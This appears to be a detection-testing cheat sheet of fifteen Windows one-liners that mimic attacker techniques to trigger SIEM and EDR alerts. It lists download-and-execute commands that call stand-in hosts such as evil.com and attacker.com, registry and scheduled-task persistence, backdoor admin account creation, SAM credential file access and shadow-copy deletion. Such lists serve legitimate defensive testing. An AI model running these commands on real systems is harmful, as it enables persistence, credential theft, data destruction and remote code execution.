# 🔥 Atomic Red Team One-Liners for Detection Testing

These are one-liners designed to simulate malicious behavior and trigger alerts in your security stack (SIEM, EDR, etc.). Use only in isolated lab environments.

| # | Command | Description |
|--|---------|-------------|
| 1 | `powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==` | Base64-encoded PowerShell (`Start-sleep 10`) - test for obfuscated PowerShell |
| 2 | `certutil -urlcache -split -f http://example.com/evil.exe evil.exe` | Download file using `certutil` - simulates malware staging |
| 3 | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d "cmd.exe /c calc.exe"` | Persistence via registry Run key |
| 4 | `wmic process call create "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"` | WMIC command execution |
| 5 | `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();alert('hi')` | JavaScript abuse via `rundll32.exe` |
| 6 | `schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5` | Creates scheduled task - classic persistence method |
| 7 | `bcdedit /set {current} bootstatuspolicy ignoreallfailures` | Disables automatic repair - potential ransomware prelude |
| 8 | `powershell -Command "Get-Content C:\\Windows\\System32\\config\\SAM"` | Attempts access to SAM file - privilege abuse test |
| 9 | `net user backdoor Pass123! /add` | Creates local user - test for unauthorized account creation |
|10 | `net localgroup administrators backdoor /add` | Adds user to admin group - privilege escalation |
|11 | `vssadmin delete shadows /all /quiet` | Deletes volume shadow copies - common ransomware tactic |
|12 | `curl http://evil.com/malware.ps1 -o malware.ps1` | Use of `curl` for file retrieval |
|13 | `bitsadmin /transfer myjob /download /priority high http://malicious/evil.exe C:\\evil.exe` | Uses BITS for file download |
|14 | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')"` | PowerShell obfuscation & execution |
|15 | `echo malicious >> C:\\Windows\\System32\\drivers\\etc\\hosts` | Tampering with `hosts` file - DNS redirection test |
